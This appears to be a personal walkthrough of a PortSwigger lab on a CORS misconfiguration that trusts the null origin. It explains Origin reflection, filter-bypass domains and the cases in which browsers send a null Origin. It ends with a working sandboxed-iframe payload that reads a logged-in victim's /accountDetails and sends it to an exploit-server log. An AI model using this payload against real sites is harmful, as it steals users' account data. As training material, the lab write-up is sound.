# [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

> the Origin headers might be checked incorrectly

request:

```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

->

response:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

> maybe some URL prefix or suffix can go trough the filters

`normal-website.com` -> `hackersnormal-website.com`

`normal-website.com` -> `normal-website.com.evil-user.net`

> sometimes Origin header supports the value null, browsers might send the value null in the Origin header in various unusual situations:

- A sandboxed iframe without allow-same-origin in its sandbox attribute
- A document loaded from a data: URL
- A document loaded from a file: URL (in many browsers)
- A cross-origin redirect chain in some cases
- Content from srcdoc in a sandboxed iframe

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

->

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

> in this lab the null Origin will be the exploit

- log in and check the `/accountDetails`
- in repeater add `Origin: null` to the request

```
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://xxx.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://yyy.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"
></iframe>
```

- since the exploit is a 'Content from srcdoc in a sandboxed iframe' situation the browser sets the Origin: null header to the request
